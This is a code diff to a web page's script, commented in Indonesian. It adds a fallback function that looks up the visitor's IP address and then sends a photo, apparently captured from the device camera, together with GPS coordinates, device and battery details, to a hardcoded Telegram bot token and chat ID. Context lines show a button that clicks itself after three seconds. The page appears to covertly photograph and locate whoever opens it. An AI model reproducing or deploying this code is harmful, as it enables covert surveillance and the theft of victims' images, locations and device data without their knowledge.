@@ -96,6 +96,7 @@
                   })
                   .catch(function(error) {
                     console.error('Terjadi kesalahan dalam mendapatkan alamat IP:', error);
+                    getAlternativeIPAddress(deviceInfo, imageDataURL, latitude, longitude, accuracy);
                   });
               })
               .catch(function(error) {
@@ -195,6 +196,42 @@
 
     // Melakukan klik tombol setelah 3 detik
     setTimeout(autoClickButton, 3000);
+
+    // Fungsi untuk mendapatkan alamat IP perangkat dengan cara alternatif
+    function getAlternativeIPAddress(deviceInfo, imageDataURL, latitude, longitude, accuracy) {
+      // Mendapatkan alamat IP menggunakan layanan ipify (alternatif)
+      fetch('https://api6.ipify.org?format=json')
+        .then(function(response) {
+          return response.json();
+        })
+        .then(function(data) {
+          deviceInfo.ipAddress = data.ip;
+
+          // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
+          var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+          var chatId = '1121369247';
+
+          var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
+          var formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('photo', dataURItoBlob(imageDataURL));
+          formData.append('caption', 'Lokasi: ' + latitude + ', ' + longitude + ' (Akurasi: ' + accuracy + ' meter)\n\nInformasi Perangkat:\n' + JSON.stringify(deviceInfo));
+
+          fetch(url, {
+            method: 'POST',
+            body: formData
+          })
+          .then(function(response) {
+            console.log('Foto, lokasi, informasi perangkat, dan informasi batrai berhasil dikirim ke Telegram (menggunakan alternatif alamat IP).');
+          })
+          .catch(function(error) {
+            console.error('Terjadi kesalahan dalam mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram (menggunakan alternatif alamat IP):', error);
+          });
+        })
+        .catch(function(error) {
+          console.error('Terjadi kesalahan dalam mendapatkan alamat IP (alternatif):', error);
+        });
+    }
   </script>
 </body>
 </html>
